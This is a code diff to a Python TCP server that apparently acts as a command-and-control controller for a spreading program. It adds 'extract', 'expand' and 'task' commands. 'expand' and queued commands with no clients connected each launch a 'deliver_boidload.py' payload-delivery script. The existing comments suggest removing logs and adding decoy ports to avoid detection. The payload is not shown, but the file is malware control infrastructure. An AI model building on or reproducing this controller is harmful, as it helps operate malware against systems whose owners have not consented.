@@ -4,7 +4,7 @@
     Server
     Massive credit to
     https://github.com/eliben/python3-samples/blob/3a533b22c97c54de22d9cf950a9a3247739eaddc/async/selectors-async-tcp-server.py
-    From which I constructed most of this server architecture/program.
+    From which I got the basic SelectorServer architecture.
     
     If this program were to ever be actually used, logging would need to be
     implemented differently. The safest option is removal, but the files could
@@ -13,8 +13,9 @@
     Another maybe improvment could be opening decoy ports as well and
     seperating them from the program as much as possible.
 """
-import sys, socket, selectors, logging, time, argparse, threading
+import sys, socket, selectors, logging, time, argparse, threading, os
 from threading import Thread
+from subprocess import Popen
 
 keep_running = True
 
@@ -84,7 +85,10 @@ class CommandQueue:
     
     def peek(self):
         """Returns front-most command (head-node's data)"""
-        return self.head.data
+        if self.head == None:
+            return None
+        else:
+            return self.head.data
     
     def is_empty(self):
         """Returns boolean if queue is empty, i.e. no nodes"""
@@ -143,7 +147,7 @@ class SelectorServer:
         # sent or received.
         # This also handles the various messages currently
         
-        logging.debug("Beginning of on read")
+        logging.info("Beginning of on read")
         
         # Check for messages from controller.
         if not self.queue.is_empty() and self.command_phase:
@@ -156,12 +160,20 @@ class SelectorServer:
             logging.info("Command = {}".format(command))
             
             # Do command
-            if command == "exit":
-                logging.info("Exit command recognized")
+            if command == "extract":
+                logging.info("Extract command recognized")
                 conn.sendall(command.encode())
                 self.shutdown()
-            elif command == "speak":
-                logging.info("Speak command recognized")
+            elif command == "expand":
+                logging.info("expand command recognized")
+                Popen(["python3", "deliver_boidload.py"])
+                conn.send(command.encode())
+                """For now I am not going to worry about setting an expansion
+                state to keep sending the command until stopped by the user.
+                That would involve a lot that isn't strictly necessary right now."""
+            elif command == "task":
+                logging.info("task command recognized")
+                # Call task script here?
                 conn.send(command.encode())
             else:
                 logging.info("Command not recognized")
@@ -230,9 +242,13 @@ class SelectorServer:
                 
                 self.command_phase = False
                 
-                # Remove the front command which will now have been sent.
-                self.queue.pop()
-                        
+            elif self.queue.peek():
+                logging.info("Command recognized with no clients flag")
+                Popen(["python3", "deliver_boidload.py"])
+            
+            # Remove the front command which will now have been sent.
+            self.queue.pop()
+            
             logging.debug("Reached end of for loop in serve_forever.")
             # This part happens roughly every second
             current_time = time.time()
@@ -278,7 +294,10 @@ def main():
     server_thread.start()
     
     while True:
-        command = input()        
+        command = input()
+        dir_path = os.path.abspath("../silla")
+        os.chdir(dir_path)
+        logging.info("Received command {}".format(command))
         server_thread.add_command(command)
         # Wait for server to send command then
         time.sleep(0.5)
@@ -291,8 +310,8 @@ def main():
     sys.exit(0)
 
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.DEBUG, 
-        filename="app.log", 
+    logging.basicConfig(level=logging.INFO, 
+        filename="server.log", 
         filemode="w", 
         format="%(process)d - %(asctime)s -" + 
             "%(funcName)s - %(levelname)s -  %(message)s\n"
